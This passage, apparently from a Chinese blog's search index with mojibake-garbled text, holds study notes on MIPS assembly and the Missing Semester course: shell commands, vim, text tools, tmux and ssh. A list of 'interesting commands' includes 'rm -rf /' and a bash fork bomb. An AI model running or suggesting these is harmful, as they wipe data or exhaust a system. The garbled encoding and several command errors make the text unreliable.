å¯»å€ 1move $a0, $zero # a0&lt;-0 è®¿é—®å†…å­˜ 12345678910# ä»ç„¶ load, store# b: byte; w: word; h: half word; ...sw: sw $ra, 0x38($sp) # å°†$raå­˜å…¥æ ˆä¸­ $sp+38çš„åœ°æ–¹sb: ...lw: ...lb: ...# ä¾‹å­sb r1, 0(R2)lb r1, 0(r2) ç®—æœ¯ 123456789101112; åŸºæœ¬ç®—æœ¯addsub; é€»è¾‘orxornor; ç§»ä½sllsrl è·³è½¬ 12345678910; jmpj: jmp labeljr: ç”¨æ³• jr $ra ç­‰jal: jmp and link, ä¿å­˜ ret addr(pc+4) åˆ° $rajalr: å€Ÿç”¨å¯„å­˜å™¨è·³è½¬ï¼Œé“¾æ¥ï¼Œå¸¸ç”¨; branch, åé¢éœ€è¦è·Ÿæ“ä½œbeq: beq $s, $t, offset # $s=$tè·³è½¬bne: b not eqbltz: branch less than zero æ¶æ„ç¼“å­˜ æœ‰ä¸¤ä¸ªç‹¬ç«‹çš„cache: æŒ‡ä»¤ å’Œ æ•°æ® RISC-Vxxx","link":"/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"},{"title":"è®¡ç®—æœºæ•™è‚²ç¼ºå¤±çš„ä¸€è¯¾","text":"The Missing Semester of your CS educationï¼Œå…±11èŠ‚è¯¾ï¼Œæ¯èŠ‚è¯¾çº¦1hã€‚ bilibili åŒè¯­å­—å¹• Missing Semester IAP 2020 ç¡®å®ä¸é”™ï¼Œæ‰‹æ•²å‘½ä»¤+è®²è§£ã€‚å¤šä½¿ç”¨Linux å­¦æ ¡åº”è¯¥åœ¨å¤§ä¸€æ•™è¿™ä¸ªï¼Œè€Œä¸æ˜¯TMçš„å¤§å­¦ç‰©ç† è¯¾ç¨‹ç½‘ç«™ 1https://missing.csail.mit.edu/ lectrue1: overview &amp; shell ä¸»è¦æ˜¯ Linux åŸºæœ¬å‘½ä»¤ overview å¦‚ä½•åˆ©ç”¨å­˜åœ¨çš„å·¥å…·ä½¿æˆ‘ä»¬å¼€å‘æ›´åŠ é«˜æ•ˆï¼Œä»¥åŠå¦‚ä½•æ›´å¥½çš„åˆ©ç”¨æˆ‘ä»¬çš„è®¡ç®—æœºï¼Œè¿™æ˜¯è¿™é—¨è¯¾ä¸»è¦è§£å†³çš„é—®é¢˜ã€‚ shell è®²è¿°äº†Linux Shell.ä¸»è¦æ˜¯bash 1shellæ˜¯è¿è¡Œåœ¨ç»ˆç«¯ä¸­çš„æ–‡æœ¬äº’åŠ¨ç¨‹åºï¼Œbashï¼ˆGNU Bourne-Again Shellï¼‰æ˜¯æœ€å¸¸ç”¨çš„ä¸€ç§shellã€‚æ˜¯å½“å‰å¤§å¤šæ•°Linuxå‘è¡Œç‰ˆçš„é»˜è®¤Shellã€‚ æ—¥æœŸ 1$ date æ‰“å° 1$ echo &quot;hello world&quot; è·¯å¾„åˆ—è¡¨ 123# å½“æˆ‘ä»¬æ‰§è¡Œä¸€äº›å‘½ä»¤æ—¶ï¼Œä¼šéå†PATHå¯»æ‰¾ï¼›æ¯”å¦‚è¯´ä½¿ç”¨ /bin/echo æ—¶åªéœ€åœ¨ç»ˆç«¯è¾“å…¥ echo å°±è¡Œ# `:` åˆ†éš”$ echo $PATH å¯»æ‰¾å‘½ä»¤çš„è·¯å¾„ 123456$ which echo/usr/bin/echo# whereiså¯ä»¥å¯»æ‰¾åˆ° åŸå§‹ä»£ç ã€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ–æ˜¯å¸®åŠ©æ–‡ä»¶$ whereis bashbash: /usr/bin/bash /usr/share/man/man1/bash.1.gz ç›®å½• 12345678910111213141516171819202122# change dir$ cd /home/username# `..` ä»£è¡¨ä¸Šä¸€çº§ç›®å½•ã€‚`.` ä»£è¡¨å½“å‰ç›®å½• $ cd ..# `-` å½“å‰ç›®å½•å’Œä¹‹å‰ç›®å½•ä¸‹åˆ‡æ¢$ cd /mnt$ cd /home$ cd -/mnt$ cd -/home$ cd -/mnt$ pwd/home/# æœ‰è¶£çš„ä¸€ç‚¹æ˜¯ï¼Œ`..`ä½¿ç”¨è¿‡å¤šçš„æƒ…å†µã€‚`/`ç›®å½•æ²¡æœ‰ä¸Šä¸€çº§ï¼Œæœ€é«˜åªèƒ½åˆ° `/`$ ../../../../../../bin/datexxx æ–‡ä»¶æ“ä½œ 1234567891011121314151617181920212223242526272829303132333435363738394041# list: åˆ—å‡ºæŒ‡å®šç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶ï¼Œé»˜è®¤å½“å‰ç›®å½•$ ls test.txt$ ls /lib root home ...# ç§»åŠ¨æ–‡ä»¶ä½ç½® move$ mov test.txt /tmp$ ls /tmptest.txt# é‡å‘½å$ cd /tmp$ mov test.txt tmp.txt$ ls tmp.txt# å¤åˆ¶ copy$ cp tmp.txt tmp1.txt# åˆ é™¤$ rm tmp1.txt# åˆ›å»ºä¸€ä¸ªæ–‡ä»¶$ touch tmp2.txt# åˆ›å»ºæ–‡ä»¶å¤¹$ mkdir tmpdir$ rmdir # rm -r ä¹Ÿè¡Œ# æŸ¥çœ‹æ–‡ä»¶æ‰€æœ‰å†…å®¹$ cat test.txthello world# æŸ¥çœ‹æ–‡ä»¶å¼€å¤´ç»“å°¾ï¼Œé»˜è®¤10è¡Œ$ head test.txt$ tail test.txt# cat é‡å®šå‘$ cat test.txt &gt; tmp.txt # å¦‚æœæ²¡æœ‰å°±åˆ›å»ºtmp.txt.$ cat &lt; text.txt &gt; tmp.txt # åŒä¸Š$ cat test.txt &gt;&gt; tmp.txt # &gt; ä¼šæ¸…é™¤åŸå…ˆå†…å®¹ã€‚&gt;&gt; ä»£è¡¨appendï¼Œè¿½åŠ è€Œä¸æ¸…é™¤ å‘½ä»¤å‚æ•°å’Œå¸®åŠ©æ–‡æ¡£ 123456789# ä¸€èˆ¬å‘½ä»¤ä¹Ÿå­˜åœ¨å‚æ•°ï¼Œä¸€èˆ¬ä¸º -?$ ls -l /home# d: dir rwx: æƒé™Read, Write, eXecute(ä¹Ÿä»£è¡¨æ˜¯å¦èƒ½å¤Ÿè®¿é—®æ­¤ç›®å½•)ã€‚# ä»å‰åˆ°å: owneræƒé™ groupæƒé™ å…¶ä½™ç”¨æˆ·æƒé™ owner group size date dir_namedrwxr-x--- 27 user user 4096 Jun 21 14:42 user # æŸ¥å¸®åŠ©æ–‡æ¡£ï¼Œqé€€å‡ºã€‚manual pages$ man ls -l use a long listing format ç®¡é“ï¼šå·¦ä¾§çš„è¾“å‡ºä½œä¸ºå³ä¾§çš„è¾“å…¥ 1234$ ls / | tail -n 1 # -n 1 æœ€åä¸€è¡Œ# æœ‰æ—¶å€™ç»™rootæƒé™æ–‡ä»¶å†™å…¥æ—¶ï¼Œæ¯”å¦‚sudo echo 123 &gt; tmp.txtä¼šæŠ¥é”™ï¼Œå¯ç”¨ä»¥ä¸‹å‘½ä»¤$ echo 123 | sudo tee tmp.txt root user: è¶…çº§ç®¡ç†å‘˜ã€‚å°½é‡å°‘ç”¨ï¼Œåœ¨è¿è¡Œé”™è¯¯çš„ç¨‹åºæ—¶ä¼šç ´åè®¡ç®—æœºã€‚ 123456# ç”¨æˆ·ä½¿ç”¨rootæƒé™$ sudo &lt;commond&gt;$ sudo supassword: xxxroot# `#` ä»£è¡¨root æƒé™ /sys æ–‡ä»¶å¤¹ï¼šå„ç§å†…æ ¸å‚æ•°ï¼Œæ˜¾ç¤ºè®¾å¤‡çš„çŠ¶æ€ã€‚linuxç³»ç»Ÿå°†å…¶è§†ä¸ºæ–‡ä»¶æš´æ¼ç»™ç”¨æˆ·ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ“ä½œä»è€Œæ§åˆ¶æŸäº›è®¾å¤‡ æœ‰è¶£çš„å‘½ä»¤ 123456789101112131415161718192021222324252627282930313233343536373839# åˆ åº“è·‘è·¯ï¼Œæ— éœ€ç¡®è®¤å¼ºåˆ¶åˆ é™¤æ‰€æœ‰çš„æ–‡ä»¶$ rm -rf /# fork ç‚¸å¼¹, ä¼šè€—å°½ç”µè„‘èµ„æº$ :(){ :|:&amp; };: # ç†è§£ä¸ºä¸€ä¸ªå‡½æ•°é€’å½’è°ƒç”¨ `:` ä¸ºå‡½æ•°å:() { : | :&amp;};:# ç”±äºlsæ‰“é”™é¢‘ç‡æ¯”è¾ƒé«˜ï¼Œä¼šå‡ºç°ä¸€ä¸ªåŠ¨ç”»(ç«è½¦)sl# cowsay æ‰“å°ä¸€æ®µè¯ cowthink ç±»ä¼¼ï¼Œä½†æ˜¯thinkcowsay &quot;nb&quot; -l æŸ¥çœ‹åŠ¨ç‰©ï¼Œéœ€è¦å®‰è£… -f æŒ‡å®šåŠ¨ç‰© ____&lt; nb &gt; ---- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || ||# figlet å­—ç¬¦å­— toiletç±»ä¼¼ figlet love &quot;&quot;# # mmm m m mmm # #&quot; &quot;# &quot;m m&quot; #&quot; # # # # #m# #&quot;&quot;&quot;&quot; &quot;mm &quot;#m#&quot; # &quot;#mm&quot;# æ‰“å°ä¸€å †ä¿¡æ¯å’Œlogoï¼Œè£…bä½¿ç”¨neofetch ç°ä»£åŒ–çš„å‘½ä»¤ï¼šå¼€å‘è€…ä½¿ç”¨rustå†™äº†å¾ˆå¤šæ›´åŠ ç°ä»£çš„å‘½ä»¤ï¼Œå¯ä»¥æ›¿ä»£ä¸€äº›è€å‘½ä»¤ 12exa =&gt; lsbat =&gt; cat Q&amp;A shell, console, terminal?1xxx lectrue2: shell script Linux è„šæœ¬çš„ä½¿ç”¨ è¯­æ³• 123456789101112131415$0 è¿è¡Œæ–‡ä»¶å$1-$9 å‚æ•°$? è·å–ä¸Šä¸€ä¸ªè¿è¡Œçš„é”™è¯¯ 0ä»£è¡¨æ­£ç¡®ï¼Œ1ä»£è¡¨å‡ºé”™$_ å­˜å‚¨ä¸Šæ¬¡è¿è¡Œçš„ç»“æœ$# å‚æ•°ä¸ªæ•°$$ è¿›ç¨‹id$@ æ‰€æœ‰çš„å‚æ•°ç»„æˆï¼Œå¯è¿­ä»£!! åœ¨æ‰§è¡Œæ—¶ä¼šæ›¿æ¢ä¸ºä¸Šä¸€ä¸ªæ‰§è¡Œçš„å‘½ä»¤# å˜é‡foo=barecho &quot;$foo&quot;# å˜é‡èµ‹å€¼ä¸ºå‘½ä»¤çš„ç»“æœfoo=$(pwd) å¾ªç¯ 1for xxx; do... done æ¡ä»¶ 1if xxx; then...fi ç¼–ç¨‹è„šæœ¬ 123# åŠ å…¥magic line æŒ‡å®šè§£æå™¨# ä¸€ä¸ª ç§°ä¹‹ä¸º `shebang` çš„ä¸œè¥¿#!/usr/bin/pyton3 man å‘½ä»¤çš„å…¶ä½™é€‰æ‹© tldr ï¼Œæ›´åŠ ç®€æ´(too long; donâ€™t read) 1tldr tar é€’å½’æŸ¥è¯¢ 1234567891011121314find . # . ä»£è¡¨å½“å‰è·¯å¾„ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šæ¯”å¦‚ `/` -name # åç§°,å¯ä»¥ä½¿ç”¨é€šé…ç¬¦ -type # ç±»å‹ d(dir) f(file) -mtime -1 # ä¿®æ”¹æ—¶é—´modify timeï¼Œ 1æŒ‡1å¤© -exec rm {} \\; # å¯¹äºå¯»æ‰¾çš„æ–‡ä»¶æ‰§è¡Œå‘½ä»¤ \\; ä¸å¯ç¼ºå°‘fd # æ›´åŠ ç°ä»£åŒ–çš„findlocate # é»˜è®¤æŸ¥æ‰¾æ•´ä¸ªè®¡ç®—æœºgrep # åº”ç”¨äºæŸ¥æ–‡ä»¶å†…å®¹ -R # é€’å½’rg # ripgrep æŸ¥æ‰¾ä½¿ç”¨è¿‡çš„å‘½ä»¤ 12345æ–¹å‘é”®çš„ä¸Šfzfzsh çš„ä¸€ä¸ªæ’ä»¶ï¼Œåœ¨è¾“å…¥æ—¶ä¼šæ˜¾ç¤ºæ›¾ç»è¾“å…¥çš„ç±»ä¼¼å‘½ä»¤ æ›´æ¸…æ™°çš„ç›®å½•ç»“æ„ 12treebroot lecture3: editor VIM normal mode: å¯ä»¥æ§åˆ¶å…‰æ ‡ï¼Œæ‰§è¡Œå‘½ä»¤â€¦ insert mode: å°±æ˜¯æ–‡æœ¬ç¼–è¾‘å™¨ã€‚ command mode: åœ¨insert mode è¾“å…¥ : åœ¨è¾“å…¥å‘½ä»¤ visual mode: æœ‰ç‚¹åƒä½¿ç”¨é¼ æ ‡é€‰ä¸­ä¸€å—è¿ç»­åŒºåŸŸ replace mode è¿›å…¥ insert mode 123456i insertï¼Œ åœ¨å…‰æ ‡å‰æ’å…¥a appendï¼Œåœ¨å…‰æ ‡åI è¡Œé¦–A è¡Œå°¾o ä¸‹ä¸€è¡Œ open a new lineO ä¸Šä¸€è¡Œ normal mode 1esc ä¹Ÿå¯ä»¥è‡ªè¡Œé…ç½® ä¿å­˜ï¼Œé€€å‡º 1234-- write quitnormal mode ä¸‹ :wq-- åŠ å…¥ ! ä»£è¡¨å¼ºåˆ¶æ‰§è¡Œ normal mode å…‰æ ‡æ“ä½œã€‚ æ‰€æœ‰çš„éƒ½å¯ä»¥åœ¨å‰é¢åŠ ä¸€ä¸ªæ•°å­—ï¼Œä»£è¡¨count123456789101112131415161718h å·¦ç§»j ä¸‹k ä¸Šl å³w å‘å‰(åä¸€ä¸ªå•è¯)ç§»åŠ¨ä¸€ä¸ª word, ä¹Ÿå°±æ˜¯ä¸€ä¸ªå•è¯ï¼Œæ ‡ç‚¹æˆ–è€…ç©ºæ ¼åˆ†å¼€ã€‚åœ¨å•è¯ç¬¬ä¸€ä¸ªå­—æ¯b å‘backç§»åŠ¨ word back of worde ç§»åŠ¨åˆ°å•è¯æœ«å°¾ end of word0 ç§»åŠ¨åˆ°è¡Œé¦–$ è¡Œå°¾^ ä¸€è¡Œç¬¬ä¸€ä¸ªéç©ºå­—ç¬¦ctrl-u upç±»ä¼¼é¼ æ ‡å‘ä¸Šæ»šåŠ¨ctrl-d down å‘ä¸‹H highest å±å¹•ç¬¬ä¸€è¡ŒL low å±å¹•æœ€åä¸€è¡ŒM mid å±å¹•ä¸­é—´ä¸€è¡Œ åˆ é™¤ 123456789101112131415d åˆ é™¤ä¸€ä¸ªå­—ç¬¦,é…åˆç§»åŠ¨å…‰æ ‡ä½¿ç”¨ dd åˆ é™¤ä¸€è¡Œï¼Œå¯ä»¥ä½¿ç”¨p D åˆ é™¤è‡³æœ«å°¾ d1G åˆ é™¤åˆ°ç¬¬ä¸€è¡Œ dG åˆ é™¤åˆ°æœ€åä¸€è¡Œ n1, n2d åˆ é™¤n1-n2è¡Œ -- åœ¨è¿™é‡Œ a around; i inside di( åˆ é™¤æ‹¬å·å†…çš„å†…å®¹ da( åˆ é™¤åŒ…æ‹¬æ‹¬å·çš„ä¸œè¥¿c change a word åˆ é™¤(d ç±»ä¼¼)å¹¶è¿›å…¥insert mode x åˆ é™¤åé¢ä¸€ä¸ªå­—ç¬¦ &lt;num&gt;x åˆ é™¤åé¢numä¸ªå­—ç¬¦s åˆ é™¤å­—ç¬¦è¿›å…¥insert modeS åˆ é™¤ä¸€è¡Œè¿›å…¥insert mode å¤åˆ¶ç²˜è´´ 12345y yank yy å¤åˆ¶å½“å‰è¡Œ y1G ...p pasteåœ¨è¿™ä¸€è¡Œåé¢P è¿™ä¸€è¡Œå‰é¢ è·³è½¬åˆ°æŸä¸€è¡Œ 12345g gg ç¬¬ä¸€è¡ŒG æœ€åä¸€è¡Œ &lt;num&gt;G è·³è½¬åˆ°numè¡Œ:&lt;num&gt; è·³åˆ°ç¬¬numè¡Œ æ’¤é”€ä¹‹å‰çš„æ“ä½œ 12u undoctrl + r redo æ¢å¤æ’¤é”€çš„å†…å®¹ visual mode: å…è®¸æˆ‘ä»¬æ”¹å˜ä¸€åˆ—ï¼Œæ•´å—å¤åˆ¶ç­‰ 123v å­—ç¬¦å¯è§†ï¼Œå¼€å§‹å’Œç»“æŸä¸¤ä¸ªå­—ç¬¦ä¸­é—´æ‰€æœ‰å†…å®¹ï¼Œé€€å‡ºæŒ‰vV è¡Œå¯è§†è¡Œï¼Œå…‰æ ‡æ‰€åœ¨è¡Œï¼Œé€€å‡º Vctrl+v å—å¯è§†ï¼Œå¼€å§‹å’Œç»“æŸå…‰æ ‡çš„çŸ©é˜µï¼Œé€€å‡ºctrl+v æœç´¢ 1234f&lt;word&gt; æœ¬è¡ŒæŸ¥æ‰¾/&lt;word&gt; æŸ¥å†…å®¹,å…¨æ–‡n ç»§ç»­å‘ä¸‹ç»§ç»­æ‰¾ nextN ç»§ç»­å‘ä¸Šæ‰¾ æ›´æ”¹ç¯å¢ƒ 1:set nu æ˜¾ç¤ºè¡Œå· ~ åè½¬å¤§å°å†™ æ‹¬å·åŒ¹é… 1% åˆ°åŒ¹é…çš„å¦ä¸€ä¸ªæ‹¬å·å¤„ tab, window, buffer 12345tab: æˆ‘ç†è§£ä¸º åœ¨ç³»ç»Ÿä¸­æ‰“å¼€vimè¿™ä¸ªè½¯ä»¶ä¸¤æ¬¡ï¼Œå°±æ˜¯ä¸¤ä¸ªtabwindow: vim å±å¹•ï¼Œå¯ä»¥åˆ†å±buffer: æ‰“å¼€æ–‡ä»¶ï¼Œæ–‡ä»¶å…·æœ‰buffer, åŒä¸€ä¸ªæ–‡ä»¶åŒä¸€ä¸ªbuffer,å®æ—¶ã€‚ é…ç½®ï¼Œvim åœ¨æ‰§è¡Œå‰ä¼šåŠ è½½ä¸€ä¸ª ~/.vimrc æ–‡ä»¶ã€‚ æˆ‘ä»¬å¯ä»¥DIYè‡ªå·±çš„å–œæ¬¢çš„æŒ‰é”®ã€‚ å®‰è£…æ’ä»¶å®ç°æ›´å¤šçš„åŠŸèƒ½ neovim æœ¬äººä½¿ç”¨ neovim é…åˆ LazyVimã€‚å¯DIY. ç„¶åå† VsCode å®‰è£…neovimæ’ä»¶ï¼ŒåŒæ­¥ä½¿ç”¨ã€‚ å¸¸ç”¨çš„æ“ä½œï¼Œneovimä¹Ÿèƒ½ç”¨ã€‚ keymap Leader ä¸º space é”®ï¼ŒæŒºå¥½ç”¨, ä½¿ç”¨è¿™äº›åŠŸèƒ½ä¹Ÿéœ€è¦å®‰è£…å¯¹åº”æ’ä»¶ æ‰“å¼€ç»ˆç«¯ 1234&lt;leader&gt;ft å½“å‰&lt;leader&gt;fT /ctrl-/ æ‰“å¼€å’Œå…³é—­ å¿«é€Ÿæ³¨é‡Š 1&lt;leader&gt;gc ä½†æ˜¯éœ€è¦æŒ‡å®šçš„ LSP ä¸åŒæ–‡ä»¶é—´(buffer)åˆ‡æ¢ 1&lt;leader&gt;bb æ–‡ä»¶æœç´¢ telescope 12345-- æ–‡ä»¶å&lt;leader&gt;&lt;leader&gt; &lt;esc&gt;&lt;esc&gt; é€€å‡º-- æ–‡ä»¶å†…å®¹&lt;leader&gt;sb æ–‡ä»¶å†… 12&lt;c-s&gt; ä¿å­˜æ–‡ä»¶&lt;leader&gt;fn new file åˆ†å± 12345678&lt;leader&gt;w| &lt;leader&gt;| ç”ŸåŠ¨è¡¨ç¤ºç«–ç€&lt;leader&gt;w- &lt;leader&gt;- æ¨ªç€-- åˆ‡æ¢ï¼Œå’Œnormal mode ä¸‹çš„ç§»åŠ¨è”ç³»&lt;C-h&gt; å·¦&lt;C-j&gt; ä¸‹&lt;C-k&gt; ä¸Š&lt;C-l&gt; å³ ä¾§è¾¹æ  neo-tree 123456789&lt;leader&gt;fe å½“å‰&lt;leader&gt;fE /&lt;leader&gt;e å½“å‰&lt;leader&gt;E /-- ä¾§è¾¹æ è¿›å…¥æ–‡ä»¶åï¼Œåœ¨è¿›å…¥ä¾§è¾¹æ &lt;C-h&gt; &lt;C-l&gt; lazy.nvim æ’ä»¶ç®¡ç†éå¸¸å—æ¬¢è¿ã€‚ä½œè€…å¼€å‘çš„æ’ä»¶å’Œé…ç½®ã€‚ lecture4: data wrangling å¤„ç†æ•°æ®çš„æŸäº›æ‰‹æ®µ grepï¼Œæœç´¢ 12grep &quot;word&quot; tmp.txt # æŸ¥è¯¢ -R # é€’å½’ï¼Œå¯ä»¥æŸ¥æ‰¾æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ sedï¼Œåœ¨æœç´¢æ›¿æ¢æ˜¯ä¸€ä¸ªå¥½ç”¨çš„å·¥å…·ã€‚éœ€è¦å­¦ä¹ ä¸€ä¸‹æ­£åˆ™è¡¨è¾¾å¼ 12345sed 's/&lt;pattern&gt;/&lt;replace&gt;/'pattern: åŒ¹é…æ¨¡å¼ï¼Œæ”¯æŒæ­£åˆ™è¡¨è¾¾å¼replace: å°†åŒ¹é…åˆ°çš„pattern è½¬æ¢ä¸º replaceã€‚å½“æ•è·æ—¶ \\num ä»£è¡¨ç¬¬numä¸ªæ•è·ï¼Œæ‰“å°# sed é»˜è®¤æ”¯æŒå¾ˆè€çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä½¿ç”¨ `-E` å‚æ•°ï¼Œæ”¯æŒç°ä»£åŒ–çš„æ­£åˆ™ ä¸€äº›æ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨ï¼Œä½¿ç”¨åœ¨çº¿ç½‘ç«™ç»ƒä¹ ã€‚regular expression 123456[0-9] 0,1,2...9 å…¶ä¸­ä¸€ä¸ªæ•°å­—* è´ªå©ªæ¨¡å¼ï¼Œ1æ¬¡æˆ–å¤šæ¬¡? 0 æˆ– 1 æ¬¡. ä»»æ„å­—ç¬¦() æ•è·æ‹¬å·å†…çš„å†…å®¹^ å¼€å¤´ $ æœ«å°¾ wc 1wc -l word count,ç»Ÿè®¡å¤§å° -l line å‡ è¡Œ æ’åºï¼Œå­—å…¸åºã€‚å»é‡ 12345sort é»˜è®¤å­—å…¸åºæ’åº -n æŒ‰ç…§æ•°å€¼çš„å¤§å°è¿›è¡Œæ’åº -k æŒ‡å®šæ’åºçš„åˆ—æ•°uniq å¯å»é™¤é‡å¤å†…å®¹ -c è®°å½•å‡ºç°æ¬¡æ•° awkï¼ŒåŸºäºæµçš„å¤„ç†ï¼Œæ˜¯ä¸€é—¨ç¼–ç¨‹è¯­è¨€ 1234awk 'script' æ‰§è¡Œä¸€ä¸ªè„šæœ¬awk '{print $0}' -F æŒ‡å®šåˆ†éš”ç¬¦ cutï¼Œç±»ä¼¼ç¼–ç¨‹è¯­è¨€çš„split 1234567cut [option] filename -d å­—èŠ‚ä¸ºå•ä½åˆ†å‰² cut -d 3 ç¬¬ä¸‰ä¸ªå­—ç¬¦ -d 3-9,12 ç¬¬3-9,12ä¸ªå­—ç¬¦ -f fields ä¸-dä¸€èµ·ä½¿ç”¨ï¼Œè¡¨ç¤ºåŒºåŸŸ cut -d : -f2 ç¬¬1-2ä¸ªå†’å·ä¹‹å‰çš„å†…å®¹ -c character å­—ç¬¦ä¸ºå•ä½ï¼Œå¤„ç†ä¸­æ–‡å¥½ç”¨ -b ç¼–ç¨‹è¯­è¨€åœ¨å‘½ä»¤è¡Œçš„ä½¿ç”¨? å„ç§ç®¡é“ï¼Œå›¾ç‰‡éŸ³é¢‘å¤„ç†? lecture5: command-line environment ä¼˜é›…çš„ä½¿ç”¨å‘½ä»¤è¡Œ job control Linux ç³»ç»Ÿçš„ signalæœºåˆ¶ 1234man signal : ä¼šçœ‹åˆ°ä¸åŒçš„number å’Œ namectrl-c SIGINT signal interruptctrl-\\ SIGQUIT ctrl+z 12345# æš‚åœï¼Œå¯æ‰§è¡Œå…¶ä»–ä»»åŠ¡&amp; åœ¨å‘½ä»¤ååŠ å…¥ï¼Œè¡¨ç¤ºåå°æ‰§è¡Œjobs æŸ¥çœ‹åå°ä»»åŠ¡ï¼Œæš‚åœæˆ–è€…è¿è¡Œ pidfg %num / bg %num ä½¿æš‚åœçš„ä»»åŠ¡ç»§ç»­è¿è¡Œï¼Œfg æ¢å¤åˆ°å‰å°ã€‚bg æ¢å¤åˆ°åå°æ‰§è¡Œã€‚front back groundkill %num åœæ­¢ terminal multiplexers ç»ˆç«¯å¤ç”¨ï¼Œåœ¨ä¸€ä¸ªterminal windowå¹²å¾ˆå¤šäº‹æƒ…ã€‚ å¾ˆå¤šçš„ç»ˆç«¯éƒ½å­˜åœ¨åˆ†å±ç­‰æ“ä½œï¼Œä½†æ˜¯è¯¾ç¨‹ä»‹ç»ç¥å™¨ tmuxï¼Œæ›´åŠ ç¥å¥‡ã€‚ ä¸ kill sessionï¼Œå…¶ä¸­çš„å‘½ä»¤ä¼šä¸€ç›´æ‰§è¡Œä¸‹å»ã€‚åªéœ€è¦å¼€å¯ä¸€æ¬¡ç»ˆç«¯ã€‚ åœ¨ssh æœåŠ¡å™¨æ—¶éå¸¸çš„å¥½ç”¨ session, window, pune å¯åŠ¨tmux, ä¼šå¼€å¯ä¸€ä¸ªsession, æ˜æ˜¾çš„æ˜¯ä¸‹é¢ä¼šå‡ºç°ä¸€è¡Œæ•°æ®ã€‚ window åˆ›å»ºä¸€ä¸ªæ–°çš„shell ç»ˆç«¯ã€‚ pune é¢æ¿ï¼Œä¸€ä¸ªçª—å£å¯ä»¥åˆ†å¾ˆå¤šçš„é¢æ¿ã€‚ å‘½ä»¤è¡Œæ“ä½œ 123456789101112tmux ä¸‹éƒ¨ä¼šå‡ºç°çŠ¶æ€æ ï¼Œåˆ†åˆ«æ˜¯session window1 windiow2... æ—¶é—´ç­‰tmux a # attach è¿›å…¥session -t name æŒ‡å®šåç§°tmux new -t &lt;name&gt; åˆ›å»ºå¹¶æŒ‡å®šåç§°tmux kill-session -t &lt;num/name&gt; æ€æ­»æŒ‡å®šçš„sessiontmux ls æŸ¥çœ‹æ‰€æœ‰çš„sessiontmux splitw -h/-v pane æ¨ªç«–åˆ†å‰²window é»˜è®¤å¿«æ·é”®ã€‚å¯ä»¥å…ˆæŒ‰ä¸€ä¸‹ ctrl-b åœ¨æŒ‰å…¶ä½™çš„ï¼Œä¸éœ€è¦åŒæ—¶æŒ‰ã€‚ 1234567891011121314151617181920212223prefix = Ctrl-b# session prefix keymapprefix d dettach sessionprefix s åˆ—å‡ºæ‰€æœ‰session vimå¿«æ·é”®ä¸‹çš„é€‰æ‹©# windowprefix c create a new windowprefix p previous windowprefix n next windowprefix &lt;n&gt; ç¬¬nä¸ªçª—å£,næ˜¯ä¸ªæ•°å­—prefix w åˆ—å‡ºwindow å’Œ session(s ?), jk é€‰æ‹©ï¼Œenterè¿›å…¥prefix , é‡å‘½å# puneprefix x å…³é—­puneprefix % ç«–ç›´åˆ‡å‰²prefix &quot; æ°´å¹³åˆ‡å‰²prefix æ–¹å‘é”® é€‰æ‹© puneprefix x å…³é—­puneprefix z æœ€å¤§åŒ–å½“å‰çª—å£ï¼Œåœ¨æŒ‰ä¸€æ¬¡é€€å‡ºprefix ! åˆ†ç¦»pune è¿›å…¥windowæŒç»­æŒ‰prefix æ–¹å‘é”® æ”¹å˜puneå¤§å° é…ç½®å¿«æ·é”®ï¼Œ ~/.tmux.confã€‚æˆ‘ä½¿ç”¨çš„æ˜¯åŸºäºç½‘ä¸Šæ‰¾çš„ tmux-confã€‚ 123456ctrl-b è·ç¦»éå¸¸æœ‰ç‚¹é˜´é—´ï¼Œå› æ­¤éœ€è¦æ”¹ã€‚ctrl-a æ˜¯qemuå¿«æ·é”®ã€‚å› æ­¤é€‰æ‹©ctrl-xprefix I install pluginsprefix alt I uninstallalt + æ–¹å‘é”®ï¼Œpune ç§»åŠ¨ æ’ä»¶ç®¡ç† Tmux Plugin Manager ç¾åŒ–+å¿«æ·é”® ç³»åˆ—æ“ä½œå‚è€ƒã€‚awesome-tmux: A list of awesome resources for tmux aliases ç»™å¸¸ç”¨çš„å‘½ä»¤è®¾ç½®åˆ«å bash çš„~/.bashrc æ–‡ä»¶1234# æ³¨æ„ï¼Œä¸è¦å­˜åœ¨ ll = 'ls -l' å› ä¸ºåœ¨shell scriptä¸­ï¼Œç©ºæ ¼æ˜¯æœ‰æ„ä¹‰çš„alias ll='ls -alF'alias la='ls -A'alias l='ls -CF' dotfiles å„ç§é…ç½®æ–‡ä»¶ã€‚å¤§éƒ¨åˆ†æ˜¯æ–‡ä»¶ bash -&gt; ~/.bashrc zsh -&gt; ~/.zshrcã€‚æˆ‘ä»¬çš„zshç¾åŒ–ä¹Ÿæ˜¯ä¿®æ”¹æ­¤æ–‡ä»¶ã€‚ vim -&gt; ~/.vimrc tmux -&gt; ~/tmux.conf neovim -&gt; ~/.config/nvim ç›®å½•ä¸‹çš„ åŸºäºlua é…ç½® ssh -&gt; ~/.ssh è¿™æ˜¯ä¸€ä¸ªç›®å½•ã€‚å¯ä»¥é…ç½®å…¬ç§é’¥ï¼Œå…å¯†ç™»å½•ã€‚ è‡ªå·±çš„æœºå™¨ ssh-keygen å‘½ä»¤ç”Ÿæˆå…¬ç§é’¥ å°†å…¬é’¥æ”¾å…¥æœåŠ¡å™¨çš„ authorized_keysã€‚æƒé™ä¸€èˆ¬æ˜¯6001234ssh-copy-id -i ~/.ssh/id_rsa.pub &lt;username&gt;@&lt;IP&gt;# å¸¸ç”¨çš„ssh ä¼ è¾“æ–‡ä»¶ scp å’Œcpå‘½ä»¤å·®ä¸å¤šï¼Œç»™å‡ºè·¯å¾„scp tmp.txt &lt;user&gt;@&lt;IP&gt;:/tmp æ„Ÿå…´è¶£çš„å¯ä»¥å­¦ä¹ ä¸€ä¸‹ NixOS, ä¸€ä¸ªåŸºäºé…ç½®æ–‡ä»¶çš„æ“ä½œç³»ç»ŸğŸ˜‹ å¤§éƒ¨åˆ†é…ç½®éƒ½å¯åœ¨ github 